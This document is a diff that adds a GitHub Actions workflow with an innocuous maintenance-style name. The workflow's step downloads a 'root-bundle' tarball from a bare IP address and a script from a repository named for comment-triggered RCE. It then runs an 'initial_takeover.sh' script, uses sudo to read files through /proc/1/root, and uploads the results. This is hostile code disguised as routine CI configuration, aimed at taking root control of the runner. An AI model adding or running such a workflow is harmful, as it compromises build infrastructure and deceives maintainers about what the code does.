@@ -1,0 +1,36 @@
+name: DM stock state-machine safe control
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  control:
+    runs-on: ubuntu-slim
+    timeout-minutes: 4
+    steps:
+      - name: Induce one bounded stock balloon and unballoon cycle
+        run: |
+          set -e
+          printf '%s\n' '${{ github.run_id }}' >/tmp/b_run_id
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/main/poc/root_dm_status_control.sh -o /tmp/root_auto.sh
+          chmod +x /tmp/root_auto.sh
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
+          for attempt in $(seq 1 230); do
+            sudo test -s /proc/1/root/tmp/dm-control-result.json && break
+            sleep 0.5
+          done
+          sudo cp /proc/1/root/tmp/dm-control-result.json ./dm-control-result.json 2>/dev/null || true
+          sudo cp /proc/1/root/tmp/dm-control.log ./dm-control.log 2>/dev/null || true
+          cat dm-control-result.json 2>/dev/null || true
+      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
+        if: always()
+        with:
+          name: dm-stateful-control-${{ github.run_id }}
+          path: |
+            dm-control-result.json
+            dm-control.log
+          if-no-files-found: ignore
